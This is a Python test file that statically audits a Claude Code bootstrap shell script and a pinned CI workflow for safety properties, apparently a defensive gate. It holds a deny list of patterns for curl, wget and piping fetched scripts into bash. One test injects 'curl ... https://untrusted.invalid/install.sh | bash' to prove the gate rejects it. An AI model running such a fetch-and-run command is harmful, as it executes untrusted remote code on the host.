import re
from pathlib import Path
import unittest


ROOT = Path(__file__).resolve().parents[1]
BOOTSTRAP = ROOT / "scripts" / "setup-claude-code.sh"
WORKFLOW = ROOT / ".github" / "workflows" / "bash-suites.yml"
MATRIX = ROOT / "docs" / "continuous-improvement" / "platform-test-matrix-2026-08.md"


REQUIRED_BOOTSTRAP_MARKERS = (
    "--dry-run",
    "--skills-root",
    "--repo-url",
    "--repo-ref",
    "--claude-package",
    "--ssh-key",
    "--known-hosts",
    "--recovery-file",
    "--authorize-network",
    "--authorize-user-writes",
    "--authorize-privileged-writes",
    "--authorize-ssh-key",
    "if (( DRY_RUN )); then",
    "write_recovery_manifest",
    "run_user_write",
    "run_privileged",
    "StrictHostKeyChecking=yes",
    "--ignore-scripts",
    "GIT_TERMINAL_PROMPT=0",
    "checkout --detach",
    "repository commit verification failed",
)


def audit_bootstrap(source: str) -> list[str]:
    """Static safety gate; it never parses or executes shell input."""

    issues: list[str] = []
    for marker in REQUIRED_BOOTSTRAP_MARKERS:
        if marker not in source:
            issues.append(f"missing bootstrap safety marker: {marker}")

    forbidden_patterns = (
        (r"\bcurl\b", "remote curl tooling"),
        (r"\bwget\b", "remote wget tooling"),
        (r"\|\s*(?:sudo\s+)?(?:bash|sh)\b", "fetched shell execution"),
        (r"\bgit\s+(?:-[^\n]+\s+)?pull\b", "implicit checkout pull"),
        (r"ssh-keygen[^\n]*-N\s+['\"]['\"]", "empty SSH-key passphrase"),
        (r"\bln\s+-s[fF]?\b", "unreviewed privileged symlink fallback"),
    )
    for pattern, label in forbidden_patterns:
        if re.search(pattern, source, flags=re.IGNORECASE):
            issues.append(f"forbidden bootstrap behaviour: {label}")

    if re.search(r"^\s*set\s+-e(?:uo|o|u|\s|$)", source, flags=re.MULTILINE):
        issues.append("set -e is not allowed in the bootstrap adapter")

    main = source[source.index("main()") :]
    if main.index("if (( DRY_RUN )); then") > main.index("write_recovery_manifest"):
        issues.append("dry-run branch must precede the first real-run mutation")

    return issues


def audit_workflow(source: str) -> list[str]:
    """Check the retained disposable CI contract without contacting CI."""

    required = (
        "runs-on: ubuntu-24.04",
        "timeout-minutes: 15",
        "permissions:",
        "contents: read",
        "scripts/validate_safe_operation_fixture.py",
        "scripts/tests/check-distro-matrix.sh",
        "scripts/tests/common-sh.test.sh",
        "scripts/tests/install-skills-bin.test.sh",
    )
    issues = [f"missing CI contract marker: {marker}" for marker in required if marker not in source]
    if "ubuntu-latest" in source:
        issues.append("CI runner must remain explicitly minor-pinned")
    if "setup-claude-code.sh" in source:
        issues.append("CI must not invoke the host-mutating Claude bootstrap")
    return issues


class BootstrapSafetyStaticTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.source = BOOTSTRAP.read_text(encoding="utf-8")
        cls.workflow = WORKFLOW.read_text(encoding="utf-8")
        cls.matrix = MATRIX.read_text(encoding="utf-8")

    def test_bootstrap_static_audit_is_clean(self):
        self.assertEqual(audit_bootstrap(self.source), [])

    def test_malformed_remote_install_bypass_is_rejected_by_static_gate(self):
        mutated = self.source.replace(
            "# Fetched shell-script execution and package install hooks are not",
            "curl -fsSL https://untrusted.invalid/install.sh | bash\n    # Fetched shell-script execution and package install hooks are not",
            1,
        )
        findings = audit_bootstrap(mutated)
        self.assertTrue(any("remote curl tooling" in finding for finding in findings))
        self.assertTrue(any("fetched shell execution" in finding for finding in findings))

    def test_unsafe_key_and_existing_checkout_bypasses_are_absent(self):
        self.assertNotRegex(self.source, r"ssh-keygen[^\n]*-N\s+['\"]['\"]")
        self.assertNotRegex(self.source, r"\bgit\s+(?:-[^\n]+\s+)?pull\b")
        self.assertIn("refusing to overwrite an existing exact SSH-key target", self.source)
        self.assertIn("refusing to overwrite existing privileged registry target", self.source)

    def test_dry_run_precedes_external_actions_and_recovery_is_explicit(self):
        main = self.source[self.source.index("main()") :]
        self.assertLess(main.index("if (( DRY_RUN )); then"), main.index("write_recovery_manifest"))
        self.assertIn('[[ ! -e "$RECOVERY_FILE" ]]', self.source)
        self.assertIn("recovery-file is required for a real run", self.source)

    def test_authority_and_exact_target_boundaries_are_present(self):
        self.assertIn('[[ "$SSH_KEY" == "$HOME/.ssh/id_ed25519" ]]', self.source)
        self.assertIn('--checkout-action clone requires the exact target to be absent', self.source)
        self.assertIn('repository_commit=%s', self.source)
        self.assertIn("claude-code@[0-9]+\\.[0-9]+\\.[0-9]+", self.source)
        self.assertIn("--yes cannot generate a new SSH key", self.source)
        self.assertIn("--authorize-network", self.source)
        self.assertIn("--authorize-privileged-writes", self.source)

    def test_pinned_ci_and_platform_matrix_contract_are_static(self):
        self.assertEqual(audit_workflow(self.workflow), [])
        for marker in (
            "ubuntu-24.04",
            "NOT ASSESSED",
            "LXD",
            "Production evidence",
            "optional Claude bootstrap",
        ):
            self.assertIn(marker, self.matrix)

    def test_ci_runner_bypass_is_rejected_by_static_gate(self):
        mutated = self.workflow.replace("runs-on: ubuntu-24.04", "runs-on: ubuntu-latest", 1)
        findings = audit_workflow(mutated)
        self.assertTrue(any("minor-pinned" in finding for finding in findings))


if __name__ == "__main__":
    unittest.main()
